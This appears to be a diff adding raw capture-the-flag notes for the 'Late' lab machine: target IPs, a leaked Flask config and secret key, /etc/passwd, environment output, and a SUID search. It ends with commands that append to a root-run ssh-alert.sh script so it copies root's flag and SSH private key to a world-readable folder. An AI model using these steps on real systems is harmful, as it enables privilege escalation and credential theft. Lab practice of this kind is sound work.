@@ -1,0 +1,140 @@
+Late
+10.129.164.55
+10.129.166.22
+
+export TARGET=10.129.164.55
+
+http://late.htb
+http://images.late.htb
+
+/etc/hosts
+10.129.164.55   images.late.htb late.htb
+
+support@late.htb
+
+config.items()
+dict_items(
+    [
+        ("ENV", "production"),
+        ("DEBUG", False),
+        ("TESTING", False),
+        ("PROPAGATE_EXCEPTIONS", None),
+        ("PRESERVE_CONTEXT_ON_EXCEPTION", None),
+        ("SECRET_KEY", b"_5#y2L"F4Q8z\n\xec]/"),
+        ("PERMANENT_SESSION_LIFETIME", datetime.timedelta(31)),
+        ("USE_X_SENDFILE", False),
+        ("SERVER_NAME", None),
+        ("APPLICATION_ROOT", "/"),
+        ("SESSION_COOKIE_NAME", "session"),
+        ("SESSION_COOKIE_DOMAIN", False),
+        ("SESSION_COOKIE_PATH", None),
+        ("SESSION_COOKIE_HTTPONLY", True),
+        ("SESSION_COOKIE_SECURE", False),
+        ("SESSION_COOKIE_SAMESITE", None),
+        ("SESSION_REFRESH_EACH_REQUEST", True),
+        ("MAX_CONTENT_LENGTH", None),
+        ("SEND_FILE_MAX_AGE_DEFAULT", None),
+        ("TRAP_BAD_REQUEST_ERRORS", None),
+        ("TRAP_HTTP_EXCEPTIONS", False),
+        ("EXPLAIN_TEMPLATE_LOADING", False),
+        ("PREFERRED_URL_SCHEME", "http"),
+        ("JSON_AS_ASCII", True),
+        ("JSON_SORT_KEYS", True),
+        ("JSONIFY_PRETTYPRINT_REGULAR", False),
+        ("JSONIFY_MIMETYPE", "application/json"),
+        ("TEMPLATES_AUTO_RELOAD", None),
+        ("MAX_COOKIE_SIZE", 4093)
+    ]
+)
+
+/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
+rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
+colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
+smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
+smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
+
+env
+USER=svc_acc
+HOME=/home/svc_acc
+LOGNAME=svc_acc
+JOURNAL_STREAM=9:21690
+SERVER_SOFTWARE=gunicorn/20.1.0
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=b81ebfed8fe64f97a3c50a5c76fa1352
+LANG=en_US.UTF-8
+SHELL=/bin/bash
+PWD=/home/svc_acc/app
+
+
+# privesc
+(remote) svc_acc@late:/usr/local/sbin$ find / -perm -4000 2>/dev/null
+/usr/sbin/pppd
+/usr/sbin/sensible-mda
+/usr/bin/chfn
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/arping
+/usr/bin/procmail
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/fusermount
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+
+
+#########
+privesc
+
+echo 'echo $(whoami) > /dev/shm/.foo/whoami' >> /usr/local/sbin/ssh-alert.sh
+echo 'cp /root/root.txt /dev/shm/.foo/root.txt' >> /usr/local/sbin/ssh-alert.sh
+echo 'cp /root/.ssh/id_rsa /dev/shm/.foo/id_rsa' >> /usr/local/sbin/ssh-alert.sh
+echo 'chmod 777 /dev/shm/.foo/root.txt' >> /usr/local/sbin/ssh-alert.sh
+echo 'chmod 777 /dev/shm/.foo/id_rsa' >> /usr/local/sbin/ssh-alert.sh
